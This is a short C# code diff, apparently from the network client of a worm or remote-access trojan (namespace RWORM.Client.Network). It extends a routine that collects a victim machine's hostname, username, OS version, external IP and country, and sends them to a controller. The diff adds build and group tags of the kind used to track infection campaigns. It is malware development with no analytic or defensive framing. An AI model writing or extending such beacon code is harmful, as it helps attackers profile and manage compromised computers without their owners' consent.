@@ -1219,14 +1219,16 @@ namespace RWORM.Client.Network
         private async Task SendSystemInfo()
         {
             var (extIp, extCc) = await FetchExternalIpInfoAsync();
-            var guid = EscapeJson(Config.GetGuid());
-            var host = EscapeJson(Config.GetHostname());
-            var user = EscapeJson(Config.GetUsername());
-            var os   = EscapeJson(Config.GetOSVersion());
-            var ip   = EscapeJson(extIp);
-            var cc   = EscapeJson(extCc);
+            var guid     = EscapeJson(Config.GetGuid());
+            var host     = EscapeJson(Config.GetHostname());
+            var user     = EscapeJson(Config.GetUsername());
+            var os       = EscapeJson(Config.GetOSVersion());
+            var ip       = EscapeJson(extIp);
+            var cc       = EscapeJson(extCc);
+            var buildId  = EscapeJson(Config.BuildId);
+            var groupTag = EscapeJson(Config.GroupTag);
 
-            var json = $"{{\"guid\":\"{guid}\",\"hostname\":\"{host}\",\"username\":\"{user}\",\"os_version\":\"{os}\",\"ip_address\":\"{ip}\",\"country_code\":\"{cc}\"}}";
+            var json = $"{{\"guid\":\"{guid}\",\"hostname\":\"{host}\",\"username\":\"{user}\",\"os_version\":\"{os}\",\"ip_address\":\"{ip}\",\"country_code\":\"{cc}\",\"build_id\":\"{buildId}\",\"group_tag\":\"{groupTag}\"}}";
             await SendAsync(CreatePacket(0x02, 0, json));
         }
 
